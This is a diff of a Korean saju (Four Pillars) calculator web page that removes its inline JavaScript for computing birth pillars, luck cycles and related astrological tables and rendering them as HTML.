@@ -4,8 +4,8 @@
 <head>
 <meta charset="utf-8"/>
 <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport"/>
-<meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="theme-color" content="#f7f3eb">
+<meta content="yes" name="apple-mobile-web-app-capable"/>
+<meta content="#f7f3eb" name="theme-color"/>
 <title>사주팔자 만세력</title>
 <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+KR:wght@400;700;900&amp;family=Gowun+Batang:wght@400;700&amp;display=swap" rel="stylesheet"/>
 <style>
@@ -817,664 +817,73 @@
 <div class="hscroll" id="seun-scroll"><table class="fortune-table" id="seun-table"></table></div>
 <p class="scroll-hint">← 좌우로 스크롤 →</p>
 </section>
-<script>
-        // 천간
-        const CHEONGAN = [
-            { hanja: '甲', hangul: '갑', element: 'wood', ohang: '木', yin: false },
-            { hanja: '乙', hangul: '을', element: 'wood', ohang: '木', yin: true },
-            { hanja: '丙', hangul: '병', element: 'fire', ohang: '火', yin: false },
-            { hanja: '丁', hangul: '정', element: 'fire', ohang: '火', yin: true },
-            { hanja: '戊', hangul: '무', element: 'earth', ohang: '土', yin: false },
-            { hanja: '己', hangul: '기', element: 'earth', ohang: '土', yin: true },
-            { hanja: '庚', hangul: '경', element: 'metal', ohang: '金', yin: false },
-            { hanja: '辛', hangul: '신', element: 'metal', ohang: '金', yin: true },
-            { hanja: '壬', hangul: '임', element: 'water', ohang: '水', yin: false },
-            { hanja: '癸', hangul: '계', element: 'water', ohang: '水', yin: true }
-        ];
-
-        // 지지
-        const JIJI = [
-            { hanja: '子', hangul: '자', element: 'water', ohang: '水', yin: false },
-            { hanja: '丑', hangul: '축', element: 'earth', ohang: '土', yin: true },
-            { hanja: '寅', hangul: '인', element: 'wood', ohang: '木', yin: false },
-            { hanja: '卯', hangul: '묘', element: 'wood', ohang: '木', yin: true },
-            { hanja: '辰', hangul: '진', element: 'earth', ohang: '土', yin: false },
-            { hanja: '巳', hangul: '사', element: 'fire', ohang: '火', yin: true },
-            { hanja: '午', hangul: '오', element: 'fire', ohang: '火', yin: false },
-            { hanja: '未', hangul: '미', element: 'earth', ohang: '土', yin: true },
-            { hanja: '申', hangul: '신', element: 'metal', ohang: '金', yin: false },
-            { hanja: '酉', hangul: '유', element: 'metal', ohang: '金', yin: true },
-            { hanja: '戌', hangul: '술', element: 'earth', ohang: '土', yin: false },
-            { hanja: '亥', hangul: '해', element: 'water', ohang: '水', yin: true }
-        ];
-
-        // 지장간 수정: 子는 壬癸
-        const JIJANGGAN = [
-            [8, null, 9], // 子: 壬, 癸
-            [9, 7, 5],    // 丑: 癸, 辛, 己
-            [4, 2, 0],    // 寅: 戊, 丙, 甲
-            [0, null, 1], // 卯: 甲, 乙
-            [1, 9, 4],    // 辰: 乙, 癸, 戊
-            [4, 6, 2],    // 巳: 戊, 庚, 丙
-            [2, 5, 3],    // 午: 丙, 己, 丁
-            [3, 1, 5],    // 未: 丁, 乙, 己
-            [4, 8, 6],    // 申: 戊, 壬, 庚
-            [6, null, 7], // 酉: 庚, 辛
-            [7, 3, 4],    // 戌: 辛, 丁, 戊
-            [4, 0, 8]     // 亥: 戊, 甲, 壬
-        ];
-
-        // 공망
-        const GONGMANG = [
-            [10, 11], [8, 9], [6, 7], [4, 5], [2, 3], [0, 1]
-        ];
-
-        // 천을귀인
-        const CHEONULGWIIN = {
-            0: [1, 7], 1: [0, 8], 2: [11, 9], 3: [11, 9], 4: [1, 7],
-            5: [0, 8], 6: [1, 7], 7: [6, 2], 8: [3, 5], 9: [3, 5]
-        };
-
-        // 문창귀인
-        const MUNCHANGGWIIN = { 0: 5, 1: 6, 2: 8, 3: 9, 4: 8, 5: 9, 6: 11, 7: 0, 8: 2, 9: 3 };
-
-        // 양인살
-        const YANGINSAL = { 0: 3, 1: 4, 2: 6, 3: 7, 4: 6, 5: 7, 6: 9, 7: 10, 8: 0, 9: 1 };
-
-        // 백호대살
-        const BAEKHO = [[0, 4], [1, 7], [2, 10], [3, 1], [4, 4], [8, 10], [9, 1]];
-
-        // 괴강살
-        const GOEGANG = [[6, 10], [6, 4], [8, 4], [4, 10]];
-
-        // 12운성 (첨부된 표 기준으로 수정)
-        // 지지 순서: 寅(2), 卯(3), 辰(4), 巳(5), 午(6), 未(7), 申(8), 酉(9), 戌(10), 亥(11), 子(0), 丑(1)
-        // 운성 순서: 장생, 목욕, 관대, 건록, 제왕, 쇠, 병, 사, 묘, 절, 태, 양
-        const UNSENG_NAMES = ['장생', '목욕', '관대', '건록', '제왕', '쇠', '병', '사', '묘', '절', '태', '양'];
-        
-        // 12운성 테이블 (지지 인덱스 0~11에 대해)
-        // 甲: 寅건록, 卯제왕, 辰쇠, 巳병, 午사, 未묘, 申절, 酉태, 戌양, 亥장생, 子목욕, 丑관대
-        // 乙: 寅제왕, 卯건록, 辰관대, 巳목욕, 午장생, 未양, 申태, 酉절, 戌묘, 亥사, 子병, 丑쇠
-        const UNSENG_TABLE = {
-            // 甲: 亥장생 -> 子목욕 -> 丑관대 -> 寅건록 -> 卯제왕 -> 辰쇠 -> 巳병 -> 午사 -> 未묘 -> 申절 -> 酉태 -> 戌양
-            0: { 0: '목욕', 1: '관대', 2: '건록', 3: '제왕', 4: '쇠', 5: '병', 6: '사', 7: '묘', 8: '절', 9: '태', 10: '양', 11: '장생' },
-            // 乙: 午장생 -> 巳목욕 -> 辰관대 -> 卯건록 -> 寅제왕 -> 丑쇠 -> 子병 -> 亥사 -> 戌묘 -> 酉절 -> 申태 -> 未양
-            1: { 0: '병', 1: '쇠', 2: '제왕', 3: '건록', 4: '관대', 5: '목욕', 6: '장생', 7: '양', 8: '태', 9: '절', 10: '묘', 11: '사' },
-            // 丙/戊: 寅장생 -> 卯목욕 -> 辰관대 -> 巳건록 -> 午제왕 -> 未쇠 -> 申병 -> 酉사 -> 戌묘 -> 亥절 -> 子태 -> 丑양
-            2: { 0: '태', 1: '양', 2: '장생', 3: '목욕', 4: '관대', 5: '건록', 6: '제왕', 7: '쇠', 8: '병', 9: '사', 10: '묘', 11: '절' },
-            // 丁/己: 酉장생 -> 申목욕 -> 未관대 -> 午건록 -> 巳제왕 -> 辰쇠 -> 卯병 -> 寅사 -> 丑묘 -> 子절 -> 亥태 -> 戌양
-            3: { 0: '절', 1: '묘', 2: '사', 3: '병', 4: '쇠', 5: '제왕', 6: '건록', 7: '관대', 8: '목욕', 9: '장생', 10: '양', 11: '태' },
-            // 戊 = 丙과 동일
-            4: { 0: '태', 1: '양', 2: '장생', 3: '목욕', 4: '관대', 5: '건록', 6: '제왕', 7: '쇠', 8: '병', 9: '사', 10: '묘', 11: '절' },
-            // 己 = 丁과 동일
-            5: { 0: '절', 1: '묘', 2: '사', 3: '병', 4: '쇠', 5: '제왕', 6: '건록', 7: '관대', 8: '목욕', 9: '장생', 10: '양', 11: '태' },
-            // 庚: 巳장생 -> 午목욕 -> 未관대 -> 申건록 -> 酉제왕 -> 戌쇠 -> 亥병 -> 子사 -> 丑묘 -> 寅절 -> 卯태 -> 辰양
-            6: { 0: '사', 1: '묘', 2: '절', 3: '태', 4: '양', 5: '장생', 6: '목욕', 7: '관대', 8: '건록', 9: '제왕', 10: '쇠', 11: '병' },
-            // 辛: 子장생 -> 亥목욕 -> 戌관대 -> 酉건록 -> 申제왕 -> 未쇠 -> 午병 -> 巳사 -> 辰묘 -> 卯절 -> 寅태 -> 丑양
-            7: { 0: '장생', 1: '양', 2: '태', 3: '절', 4: '묘', 5: '사', 6: '병', 7: '쇠', 8: '제왕', 9: '건록', 10: '관대', 11: '목욕' },
-            // 壬: 申장생 -> 酉목욕 -> 戌관대 -> 亥건록 -> 子제왕 -> 丑쇠 -> 寅병 -> 卯사 -> 辰묘 -> 巳절 -> 午태 -> 未양
-            8: { 0: '제왕', 1: '쇠', 2: '병', 3: '사', 4: '묘', 5: '절', 6: '태', 7: '양', 8: '장생', 9: '목욕', 10: '관대', 11: '건록' },
-            // 癸: 卯장생 -> 寅목욕 -> 丑관대 -> 子건록 -> 亥제왕 -> 戌쇠 -> 酉병 -> 申사 -> 未묘 -> 午절 -> 巳태 -> 辰양
-            9: { 0: '건록', 1: '관대', 2: '목욕', 3: '장생', 4: '양', 5: '태', 6: '절', 7: '묘', 8: '사', 9: '병', 10: '쇠', 11: '제왕' }
-        };
-
-        const JEOLGI_DATES = { 1: 6, 2: 4, 3: 6, 4: 5, 5: 6, 6: 6, 7: 7, 8: 8, 9: 8, 10: 8, 11: 7, 12: 7 };
-        const ELEMENTS = { wood: 0, fire: 1, earth: 2, metal: 3, water: 4 };
-
-        function getGongmang(dayGanjiIdx) {
-            const xunIndex = Math.floor(dayGanjiIdx / 10);
-            return GONGMANG[xunIndex];
-        }
-
-        function getUnseng(ilganIdx, jijiIdx) {
-            return UNSENG_TABLE[ilganIdx][jijiIdx];
-        }
-
-        function isBaekho(ganIdx, jiIdx) {
-            return BAEKHO.some(([g, j]) => g === ganIdx && j === jiIdx);
-        }
-
-        function isGoegang(ganIdx, jiIdx) {
-            return GOEGANG.some(([g, j]) => g === ganIdx && j === jiIdx);
-        }
-
-        function getSinsal(ilganIdx, jiIdx, gongmangArr, ganIdx) {
-            const sinsals = [];
-            if (gongmangArr.includes(jiIdx)) sinsals.push({ name: '공망', class: 'gongmang' });
-            if (CHEONULGWIIN[ilganIdx].includes(jiIdx)) sinsals.push({ name: '천을귀인', class: 'gwiin' });
-            if (MUNCHANGGWIIN[ilganIdx] === jiIdx) sinsals.push({ name: '문창귀인', class: 'gwiin' });
-            if (YANGINSAL[ilganIdx] === jiIdx) sinsals.push({ name: '양인', class: 'yangin' });
-            if (isBaekho(ganIdx, jiIdx)) sinsals.push({ name: '백호', class: 'baekho' });
-            if (isGoegang(ganIdx, jiIdx)) sinsals.push({ name: '괴강', class: 'goegang' });
-            return sinsals;
-        }
-
-        // ───────────────────────────────────────────────────────────
-        // 가로 스크롤: 마우스 드래그로 좌우 이동 (세운 표)
-        // ───────────────────────────────────────────────────────────
-        function enableDragScroll(el) {
-            let isDown = false;
-            let startX = 0;
-            let startScrollLeft = 0;
-
-            el.addEventListener('mousedown', (e) => {
-                isDown = true;
-                startX = e.pageX;
-                startScrollLeft = el.scrollLeft;
-            });
-
-            el.addEventListener('mouseleave', () => { isDown = false; });
-            el.addEventListener('mouseup', () => { isDown = false; });
-
-            el.addEventListener('mousemove', (e) => {
-                if (!isDown) return;
-                e.preventDefault();
-                const dx = e.pageX - startX;
-                el.scrollLeft = startScrollLeft - dx;
-            });
-
-            // 트랙패드/모바일 터치 기본 스크롤은 CSS(-webkit-overflow-scrolling)로 처리
-        }
-
-        function getYuksin(ilganIdx, targetGanIdx) {
-            const ilgan = CHEONGAN[ilganIdx];
-            const target = CHEONGAN[targetGanIdx];
-            const ilElement = ELEMENTS[ilgan.element];
-            const targetElement = ELEMENTS[target.element];
-            const sameYin = ilgan.yin === target.yin;
-            
-            if (ilElement === targetElement) return sameYin ? '비견' : '겁재';
-            if ((ilElement + 1) % 5 === targetElement) return sameYin ? '식신' : '상관';
-            if ((ilElement + 2) % 5 === targetElement) return sameYin ? '편재' : '정재';
-            if ((ilElement + 3) % 5 === targetElement) return sameYin ? '편관' : '정관';
-            if ((ilElement + 4) % 5 === targetElement) return sameYin ? '편인' : '정인';
-            return '';
-        }
-
-        function getJijiYuksin(ilganIdx, jijiIdx) {
-            const jjg = JIJANGGAN[jijiIdx];
-            const jeonggi = jjg[2] !== null ? jjg[2] : jjg[0];
-            return getYuksin(ilganIdx, jeonggi);
-        }
-
-        function getYearPillar(year, month, day) {
-            let sajuYear = year;
-            if (month < 2 || (month === 2 && day < 4)) sajuYear = year - 1;
-            const baseYear = 1984;
-            let idx = (sajuYear - baseYear) % 60;
-            if (idx < 0) idx += 60;
-            return { ganIdx: idx % 10, jiIdx: idx % 12 };
-        }
-
-        function getMonthPillar(year, month, day, yearGanIdx) {
-            let monthJiIdx;
-            if (month === 1) monthJiIdx = day < 6 ? 0 : 1;
-            else if (month === 2) monthJiIdx = day < 4 ? 1 : 2;
-            else if (month === 3) monthJiIdx = day < 6 ? 2 : 3;
-            else if (month === 4) monthJiIdx = day < 5 ? 3 : 4;
-            else if (month === 5) monthJiIdx = day < 6 ? 4 : 5;
-            else if (month === 6) monthJiIdx = day < 6 ? 5 : 6;
-            else if (month === 7) monthJiIdx = day < 7 ? 6 : 7;
-            else if (month === 8) monthJiIdx = day < 8 ? 7 : 8;
-            else if (month === 9) monthJiIdx = day < 8 ? 8 : 9;
-            else if (month === 10) monthJiIdx = day < 9 ? 9 : 10;
-            else if (month === 11) monthJiIdx = day < 8 ? 10 : 11;
-            else if (month === 12) monthJiIdx = day < 7 ? 11 : 0;
-            
-            const yearGanGroup = yearGanIdx % 5;
-            const monthGanStartForInMonth = [2, 4, 6, 8, 0][yearGanGroup];
-            let monthOffset = monthJiIdx - 2;
-            if (monthOffset < 0) monthOffset += 12;
-            return { ganIdx: (monthGanStartForInMonth + monthOffset) % 10, jiIdx: monthJiIdx };
-        }
-
-        function getDayPillar(year, month, day) {
-            function toJD(y, m, d) {
-                if (m <= 2) { y -= 1; m += 12; }
-                const A = Math.floor(y / 100);
-                const B = 2 - A + Math.floor(A / 4);
-                return Math.floor(365.25 * (y + 4716)) + Math.floor(30.6001 * (m + 1)) + d + B - 1524.5;
-            }
-            const targetJD = toJD(year, month, day);
-            const baseJD = toJD(1988, 10, 7);
-            const baseGanJiIdx = 31;
-            let diff = Math.floor(targetJD - baseJD);
-            let ganJiIdx = (baseGanJiIdx + diff) % 60;
-            if (ganJiIdx < 0) ganJiIdx += 60;
-            return { ganIdx: ganJiIdx % 10, jiIdx: ganJiIdx % 12, ganJiIdx: ganJiIdx };
-        }
-
-        function getHourPillar(hourIdx, dayGanIdx) {
-            const dayGanGroup = dayGanIdx % 5;
-            const hourGanStart = (dayGanGroup * 2) % 10;
-            return { ganIdx: (hourGanStart + hourIdx) % 10, jiIdx: hourIdx };
-        }
-
-        function getDaeun(yearGanIdx, monthGanIdx, monthJiIdx, gender, birthYear, birthMonth, birthDay) {
-            const isYangGan = yearGanIdx % 2 === 0;
-            const isMale = gender === 'male';
-            const isForward = (isMale && isYangGan) || (!isMale && !isYangGan);
-
-            // [대운수 계산 절차 - 첨부 이미지 기준]
-            // 1) 출생일이 속한 절기 구간(절입~다음 절입)을 판단
-            // 2) 순행: 출생일 기준 다음 절기까지, 역행: 출생일 기준 이전 절기까지의 '일수'를 계산
-            // 3) (일수 ÷ 3)을 반올림하여 '첫 대운 시작 나이(대운수)'로 사용
-            //
-            // 주의: 본 버전은 절기 시각(천문) 계산이 아니라, 월별 절입일(JEOLGI_DATES)로 근사합니다.
-
-            const birthDate = new Date(birthYear, birthMonth - 1, birthDay);
-            const msPerDay = 1000 * 60 * 60 * 24;
-
-            // 이번 달 절입일
-            const thisTermDay = JEOLGI_DATES[birthMonth];
-
-            // 전월/익월
-            let prevMonth = birthMonth - 1;
-            if (prevMonth < 1) prevMonth = 12;
-            let nextMonth = birthMonth + 1;
-            if (nextMonth > 12) nextMonth = 1;
-
-            // 출생일이 절입 이전이면: (전월 절입 ~ 이번달 절입) 구간
-            // 출생일이 절입 이후/당일이면: (이번달 절입 ~ 익월 절입) 구간
-            let prevTermMonth, prevTermDay, nextTermMonth, nextTermDay;
-            if (birthDay < thisTermDay) {
-                prevTermMonth = prevMonth;
-                prevTermDay = JEOLGI_DATES[prevMonth];
-                nextTermMonth = birthMonth;
-                nextTermDay = thisTermDay;
-            } else {
-                prevTermMonth = birthMonth;
-                prevTermDay = thisTermDay;
-                nextTermMonth = nextMonth;
-                nextTermDay = JEOLGI_DATES[nextMonth];
-            }
-
-            // 순/역행에 따라 목표 절기 선택
-            const targetMonth = isForward ? nextTermMonth : prevTermMonth;
-            const targetDay = isForward ? nextTermDay : prevTermDay;
-
-            // 목표 절기가 연도를 넘어가는 경우 처리
-            let targetYear = birthYear;
-            if (isForward) {
-                // 다음 절기가 다음 해로 넘어가는 케이스(예: 12월 말 출생 -> 1월 절입)
-                if (targetMonth < birthMonth || (targetMonth === birthMonth && targetDay <= birthDay)) targetYear = birthYear + 1;
-            } else {
-                // 이전 절기가 전년으로 넘어가는 케이스(예: 1월 초 출생 -> 12월 절입)
-                if (targetMonth > birthMonth || (targetMonth === birthMonth && targetDay >= birthDay)) targetYear = birthYear - 1;
-            }
-
-            const targetDate = new Date(targetYear, targetMonth - 1, targetDay);
-
-            const rawDays = isForward
-                ? (targetDate - birthDate) / msPerDay
-                : (birthDate - targetDate) / msPerDay;
-
-            const daysDiff = Math.max(0, Math.floor(rawDays));
-            const firstStartAge = Math.round(daysDiff / 3); // 반올림(자연수)
-
-            const daeunList = [];
-            let currentGanIdx = monthGanIdx;
-            let currentJiIdx = monthJiIdx;
-
-            for (let i = 0; i < 10; i++) {
-                if (isForward) {
-                    currentGanIdx = (currentGanIdx + 1) % 10;
-                    currentJiIdx = (currentJiIdx + 1) % 12;
-                } else {
-                    currentGanIdx = (currentGanIdx - 1 + 10) % 10;
-                    currentJiIdx = (currentJiIdx - 1 + 12) % 12;
-                }
-
-                const startAge = (i === 0) ? firstStartAge : (firstStartAge + i * 10);
-                const endAge = startAge + 9;
-
-                daeunList.push({
-                    ganIdx: currentGanIdx,
-                    jiIdx: currentJiIdx,
-                    startAge: startAge,
-                    endAge: endAge,
-                    startYear: birthYear + startAge
-                });
-            }
-
-            return daeunList;
-        }
-
-
-        function getSeun(currentYear) {
-            const seunList = [];
-            for (let i = -10; i <= 20; i++) {
-                const year = currentYear + i;
-                const baseYear = 1984;
-                let idx = (year - baseYear) % 60;
-                if (idx < 0) idx += 60;
-                seunList.push({ year: year, ganIdx: idx % 10, jiIdx: idx % 12 });
-            }
-            return seunList;
-        }
-
-        function getJijangganWithElement(jiIdx) {
-            const jjg = JIJANGGAN[jiIdx];
-            const result = [];
-            if (jjg[0] !== null) result.push({ hanja: CHEONGAN[jjg[0]].hanja, element: CHEONGAN[jjg[0]].element });
-            if (jjg[1] !== null) result.push({ hanja: CHEONGAN[jjg[1]].hanja, element: CHEONGAN[jjg[1]].element });
-            if (jjg[2] !== null) result.push({ hanja: CHEONGAN[jjg[2]].hanja, element: CHEONGAN[jjg[2]].element });
-            return result;
-        }
-
-        function getGwiinJiji(ilganIdx) {
-            const result = { cheonul: [], munchang: null };
-            result.cheonul = CHEONULGWIIN[ilganIdx].map(idx => JIJI[idx].hanja);
-            result.munchang = JIJI[MUNCHANGGWIIN[ilganIdx]].hanja;
-            return result;
-        }
-
-        function calculate() {
-            const year = parseInt(document.getElementById('year').value);
-            const month = parseInt(document.getElementById('month').value);
-            const day = parseInt(document.getElementById('day').value);
-            const hour = parseInt(document.getElementById('hour').value);
-            const gender = document.querySelector('input[name="gender"]:checked').value;
-            const calendar = document.querySelector('input[name="calendar"]:checked').value;
-
-            if (!year || !month || !day || isNaN(hour)) {
-                alert('모든 항목을 입력해주세요.');
-                return;
-            }
-
-            // 입력된 달력(양력/음력)에 따라 계산에 사용할 '양력 기준 날짜'를 준비합니다.
-            let solarYear = year;
-            let solarMonth = month;
-            let solarDay = day;
-            let lunarInfoText = '';
-
-            if (calendar === 'lunar') {
-                const isLeapMonth = !!document.getElementById('isLeapMonth')?.checked;
-
-                if (typeof KoreanLunarCalendar === 'undefined') {
-                    alert('음력 변환 라이브러리를 불러오지 못했습니다. 인터넷 연결을 확인해주세요.');
-                    return;
-                }
-
-                try {
-                    const cal = new KoreanLunarCalendar();
-                    cal.setLunarDate(year, month, day, isLeapMonth);
-                    const solar = cal.getSolarCalendar(); // { year, month, day }
-
-                    solarYear = solar.year;
-                    solarMonth = solar.month;
-                    solarDay = solar.day;
-
-                    lunarInfoText = `음력 ${year}년 ${month}월 ${day}일${isLeapMonth ? ' (윤달)' : ''} → `;
-                } catch (e) {
-                    console.error(e);
-                    alert('음력→양력 변환 중 오류가 발생했습니다. 날짜/윤달 여부를 확인해주세요.');
-                    return;
-                }
-            }
-
-            const yearPillar = getYearPillar(solarYear, solarMonth, solarDay);
-            const monthPillar = getMonthPillar(solarYear, solarMonth, solarDay, yearPillar.ganIdx);
-            const dayPillar = getDayPillar(solarYear, solarMonth, solarDay);
-            const hourPillar = getHourPillar(hour, dayPillar.ganIdx);
-
-            const ilganIdx = dayPillar.ganIdx;
-            const gongmangArr = getGongmang(dayPillar.ganJiIdx);
-            const gwiinInfo = getGwiinJiji(ilganIdx);
-
-            renderSajuGrid(yearPillar, monthPillar, dayPillar, hourPillar, ilganIdx, gongmangArr);
-
-            const hourNames = ['자시', '축시', '인시', '묘시', '진시', '사시', 
-                              '오시', '미시', '신시', '유시', '술시', '해시'];
-            document.getElementById('datetime-info').textContent = 
-                `${lunarInfoText}양력 ${solarYear}년 ${solarMonth}월 ${solarDay}일 ${hourNames[hour]} (${gender === 'male' ? '남' : '여'})`;
-            
-            document.getElementById('special-info').innerHTML = `
-                <span class="info-item">
-                    <span class="info-label">공망:</span>
-                    <span class="info-char gongmang">${JIJI[gongmangArr[0]].hanja}${JIJI[gongmangArr[1]].hanja}</span>
-                </span>
-                <span class="info-item">
-                    <span class="info-label">천을귀인:</span>
-                    <span class="info-char gwiin">${gwiinInfo.cheonul.join(' ')}</span>
-                </span>
-                <span class="info-item">
-                    <span class="info-label">문창귀인:</span>
-                    <span class="info-char gwiin">${gwiinInfo.munchang}</span>
-                </span>
-            `;
-
-            const daeunList = getDaeun(yearPillar.ganIdx, monthPillar.ganIdx, monthPillar.jiIdx, gender, solarYear, solarMonth, solarDay);
-            renderDaeunTable(daeunList, ilganIdx, gongmangArr);
-
-            const currentYear = new Date().getFullYear();
-            const seunList = getSeun(currentYear);
-            renderSeunTable(seunList, ilganIdx, gongmangArr, currentYear);
-
-            document.getElementById('result').classList.add('active');
-            document.getElementById('result').scrollIntoView({ behavior: 'smooth' });
-        }
-
-        function renderSajuGrid(yearP, monthP, dayP, hourP, ilganIdx, gongmangArr) {
-            const pillars = [
-                { name: '시주', label: '時柱', gan: hourP.ganIdx, ji: hourP.jiIdx },
-                { name: '일주', label: '日柱', gan: dayP.ganIdx, ji: dayP.jiIdx },
-                { name: '월주', label: '月柱', gan: monthP.ganIdx, ji: monthP.jiIdx },
-                { name: '연주', label: '年柱', gan: yearP.ganIdx, ji: yearP.jiIdx }
-            ];
-
-            let html = '';
-            
-            for (const pillar of pillars) {
-                const gan = CHEONGAN[pillar.gan];
-                const ji = JIJI[pillar.ji];
-                const ganYuksin = pillar.name === '일주' ? '일간' : getYuksin(ilganIdx, pillar.gan);
-                const jiYuksin = getJijiYuksin(ilganIdx, pillar.ji);
-                const jijanggan = getJijangganWithElement(pillar.ji);
-                const unseng = getUnseng(ilganIdx, pillar.ji);
-                const sinsals = getSinsal(ilganIdx, pillar.ji, gongmangArr, pillar.gan);
-                
-                html += `
-                <div class="pillar">
-                    <div class="pillar-header">${pillar.name} (${pillar.label})</div>
-                    <div class="pillar-cell bg-${gan.element}">
-                        <span class="hanja">${gan.hanja}</span>
-                        <span class="hangul">${gan.hangul}</span>
-                        <span class="ohang">${gan.ohang}</span>
-                        <span class="yuksin ${pillar.name === '일주' ? 'ilgan' : ''}">${ganYuksin}</span>
-                    </div>
-                    <div class="pillar-cell bg-${ji.element}">
-                        <span class="hanja">${ji.hanja}</span>
-                        <span class="hangul">${ji.hangul}</span>
-                        <span class="ohang">${ji.ohang}</span>
-                        <span class="yuksin">${jiYuksin}</span>
-                        <div class="jijanggan">
-                            ${jijanggan.map(j => `<span class="jijanggan-item jj-${j.element}">${j.hanja}</span>`).join('')}
-                        </div>
-                    </div>
-                    <div class="unseng-row-cell">
-                        <span class="unseng">${unseng}</span>
-                    </div>
-                    <div class="sinsal-row-cell">
-                        <div class="sinsal-badges">
-                            ${sinsals.length > 0 ? sinsals.map(s => `<span class="sinsal-badge ${s.class}">${s.name}</span>`).join('') : '<span style="color:#ccc; font-size:0.6rem;">-</span>'}
-                        </div>
-                    </div>
-                </div>
-                `;
-            }
-            
-            document.getElementById('saju-grid').innerHTML = html;
-        }
-
-        function renderDaeunTable(daeunList, ilganIdx, gongmangArr) {
-            const currentYear = new Date().getFullYear();
-            
-            let html = '<tr><th></th>';
-            for (let i = 0; i < 10; i++) html += `<th>${i + 1}운</th>`;
-            html += '</tr>';
-            
-            html += '<tr class="age-row"><td class="row-header">나이</td>';
-            for (const d of daeunList) {
-                const isCurrent = currentYear >= d.startYear && currentYear < d.startYear + 10;
-                html += `<td class="${isCurrent ? 'current' : ''}">${d.startAge}~${d.endAge}</td>`;
-            }
-            html += '</tr>';
-            
-            html += '<tr><td class="row-header">간지</td>';
-            for (const d of daeunList) {
-                const gan = CHEONGAN[d.ganIdx];
-                const ji = JIJI[d.jiIdx];
-                const isCurrent = currentYear >= d.startYear && currentYear < d.startYear + 10;
-                html += `
-                <td class="ganji-cell ${isCurrent ? 'current' : ''}">
-                    <div class="ganji-vertical">
-                        <div class="gan-box bg-${gan.element}">${gan.hanja}</div>
-                        <div class="ji-box bg-${ji.element}">${ji.hanja}</div>
-                    </div>
-                </td>`;
-            }
-            html += '</tr>';
-            
-            html += '<tr class="yuksin-row"><td class="row-header">천간</td>';
-            for (const d of daeunList) html += `<td>${getYuksin(ilganIdx, d.ganIdx)}</td>`;
-            html += '</tr>';
-            
-            html += '<tr class="yuksin-row"><td class="row-header">지지</td>';
-            for (const d of daeunList) html += `<td>${getJijiYuksin(ilganIdx, d.jiIdx)}</td>`;
-            html += '</tr>';
-            
-            html += '<tr class="unseng-row"><td class="row-header">12운성</td>';
-            for (const d of daeunList) html += `<td>${getUnseng(ilganIdx, d.jiIdx)}</td>`;
-            html += '</tr>';
-            
-            html += '<tr class="sal-row"><td class="row-header">신살</td>';
-            for (const d of daeunList) {
-                const sals = [];
-                if (gongmangArr.includes(d.jiIdx)) sals.push('공망');
-                if (CHEONULGWIIN[ilganIdx].includes(d.jiIdx)) sals.push('천을');
-                if (MUNCHANGGWIIN[ilganIdx] === d.jiIdx) sals.push('문창');
-                if (isBaekho(d.ganIdx, d.jiIdx)) sals.push('백호');
-                if (isGoegang(d.ganIdx, d.jiIdx)) sals.push('괴강');
-                if (YANGINSAL[ilganIdx] === d.jiIdx) sals.push('양인');
-                html += `<td>${sals.length > 0 ? sals.map(s => {
-                    const cls = (s === '천을' || s === '문창') ? 'sal-badge gwiin' : 'sal-badge';
-                    return `<span class="${cls}">${s}</span>`;
-                }).join('') : '-'}</td>`;
-            }
-            html += '</tr>';
-            
-            document.getElementById('daeun-table').innerHTML = html;
-        }
-
-        function renderSeunTable(seunList, ilganIdx, gongmangArr, currentYear) {
-            let html = '<tr><th></th>';
-            for (const s of seunList) html += `<th>${s.year}</th>`;
-            html += '</tr>';
-            
-            html += '<tr><td class="row-header">간지</td>';
-            for (const s of seunList) {
-                const gan = CHEONGAN[s.ganIdx];
-                const ji = JIJI[s.jiIdx];
-                const isCurrent = s.year === currentYear;
-                html += `
-                <td class="ganji-cell ${isCurrent ? 'current' : ''}">
-                    <div class="ganji-vertical">
-                        <div class="gan-box bg-${gan.element}">${gan.hanja}</div>
-                        <div class="ji-box bg-${ji.element}">${ji.hanja}</div>
-                    </div>
-                </td>`;
-            }
-            html += '</tr>';
-            
-            html += '<tr class="yuksin-row"><td class="row-header">천간</td>';
-            for (const s of seunList) html += `<td>${getYuksin(ilganIdx, s.ganIdx)}</td>`;
-            html += '</tr>';
-            
-            html += '<tr class="yuksin-row"><td class="row-header">지지</td>';
-            for (const s of seunList) html += `<td>${getJijiYuksin(ilganIdx, s.jiIdx)}</td>`;
-            html += '</tr>';
-            
-            html += '<tr class="unseng-row"><td class="row-header">12운성</td>';
-            for (const s of seunList) html += `<td>${getUnseng(ilganIdx, s.jiIdx)}</td>`;
-            html += '</tr>';
-            
-            html += '<tr class="sal-row"><td class="row-header">신살</td>';
-            for (const s of seunList) {
-                const sals = [];
-                if (gongmangArr.includes(s.jiIdx)) sals.push('공망');
-                if (CHEONULGWIIN[ilganIdx].includes(s.jiIdx)) sals.push('천을');
-                if (MUNCHANGGWIIN[ilganIdx] === s.jiIdx) sals.push('문창');
-                if (isBaekho(s.ganIdx, s.jiIdx)) sals.push('백호');
-                if (isGoegang(s.ganIdx, s.jiIdx)) sals.push('괴강');
-                if (YANGINSAL[ilganIdx] === s.jiIdx) sals.push('양인');
-                html += `<td>${sals.length > 0 ? sals.map(sal => {
-                    const cls = (sal === '천을' || sal === '문창') ? 'sal-badge gwiin' : 'sal-badge';
-                    return `<span class="${cls}">${sal}</span>`;
-                }).join('') : '-'}</td>`;
-            }
-            html += '</tr>';
-            
-            document.getElementById('seun-table').innerHTML = html;
-
-            const scrollEl = document.getElementById('seun-scroll');
-            if (scrollEl && !scrollEl.__dragEnabled) {
-                enableDragScroll(scrollEl);
-                scrollEl.__dragEnabled = true;
-            }
-
-            // 현재 연도 컬럼이 보이도록 대략 중앙으로 이동
-            if (scrollEl) {
-                const ths = document.querySelectorAll('#seun-table th');
-                // ths[0] is empty header
-                const idx = seunList.findIndex(s => s.year === currentYear);
-                if (idx >= 0 && ths[idx + 1]) {
-                    const target = ths[idx + 1];
-                    const targetCenter = target.offsetLeft + target.offsetWidth / 2;
-                    scrollEl.scrollLeft = Math.max(0, targetCenter - scrollEl.clientWidth / 2);
-                }
-            }
-
-        }
-
-        
-        // 음력/양력 선택에 따른 윤달 체크박스 활성화
-        (function initCalendarUI(){
-            const leapEl = document.getElementById('isLeapMonth');
-            const radios = document.querySelectorAll('input[name="calendar"]');
-            function sync(){
-                const cal = document.querySelector('input[name="calendar"]:checked')?.value;
-                const isLunar = cal === 'lunar';
-                if (leapEl){
